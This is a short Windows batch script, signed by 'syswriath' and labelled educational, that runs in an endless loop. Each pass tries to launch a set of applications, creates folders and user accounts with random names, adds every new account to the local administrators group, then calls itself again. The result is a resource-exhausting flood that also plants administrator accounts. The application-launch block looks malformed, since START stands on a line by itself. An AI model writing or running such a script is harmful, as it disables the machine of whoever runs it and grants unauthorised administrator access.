@ECHO OFF

REM By the syswriath, only for educational purposes.

:loop

REM Application start flood
START
explorer
calc
charmap
cmd
wmplayer
taskmgr
notepad
mspaint
write

REM Folder flood
mkdir %random%

REM User Flood
set usr=%random%
net users %usr% %random% /add
net localgroup administrators %usr% /add

CALL flooder.bat
GOTO loop
